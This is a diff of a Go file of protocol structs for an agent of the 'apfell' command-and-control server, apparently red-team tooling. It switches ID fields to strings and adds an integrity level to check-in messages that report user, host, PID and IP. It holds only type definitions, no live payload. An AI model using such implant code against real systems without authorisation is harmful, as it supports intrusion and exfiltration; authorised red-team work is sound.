@@ -11,7 +11,7 @@ type ThreadMsg struct {
 type Task struct {
 	Command string `json:"command"`
 	Params  string `json:"params"`
-	ID      int    `json:"id"`
+	ID      string `json:"id"`
 }
 
 // ClientResponse used to define a task response struct
@@ -37,7 +37,7 @@ type CheckinResponse struct {
 	C2profile      string `json:"c2_profile"`
 	PCallback      string `json:"pcallback"`
 	Operation      string `json:"operation"`
-	ID             int    `json:"id"`
+	ID             string `json:"id"`
 }
 
 // EKEInit used to initiate a key exchange with the apfell server
@@ -58,20 +58,20 @@ type TaskResponse struct {
 	Timestamp  string                   `json:"timestamp"`
 	Task       NestedApfellTaskResponse `json:"task"`
 	Response   string                   `json:"response"`
-	ResponseID int                      `json:"id"`
-	FileID     int                      `json:"file_id"`
+	ResponseID string                   `json:"id"`
+	FileID     string                   `json:"file_id"`
 }
 
 //FileRegisterResponse used for holding the response after file registration
 type FileRegisterResponse struct {
 	Status string `json:"status"`
-	FileID int    `json:"file_id"`
+	FileID string `json:"file_id"`
 }
 
 // FileRegisterRequest used to register a file download
 type FileRegisterRequest struct {
-	Chunks int `json:"total_chunks"`
-	Task   int `json:"task"`
+	Chunks int    `json:"total_chunks"`
+	Task   string `json:"task"`
 }
 
 // NestedApfellTaskResponse used to hold the task response field
@@ -89,7 +89,7 @@ type NestedApfellTaskResponse struct {
 type FileChunk struct {
 	ChunkNumber int    `json:"chunk_num"`
 	ChunkData   string `json:"chunk_data"`
-	FileID      int    `json:"file_id"`
+	FileID      string `json:"file_id"`
 }
 
 // FileChunkResponse used to handle the FileChunk response from Apfell
@@ -99,15 +99,16 @@ type FileChunkResponse struct {
 
 //FileUploadParams - handle parameters for the file upload response
 type FileUploadParams struct {
-	FileID     int    `json:"file_id"`
+	FileID     string `json:"file_id"`
 	RemotePath string `json:"remote_path"`
 }
 
 // CheckInStruct used for Checkin messages to Apfell
 type CheckInStruct struct {
-	User string `json:"user"`
-	Host string `json:"host"`
-	Pid  int    `json:"pid"`
-	IP   string `json:"ip"`
-	UUID string `json:"uuid"`
+	User           string `json:"user"`
+	Host           string `json:"host"`
+	Pid            int    `json:"pid"`
+	IP             string `json:"ip"`
+	UUID           string `json:"uuid"`
+	IntegrityLevel int    `json:"integrity_level"`
 }
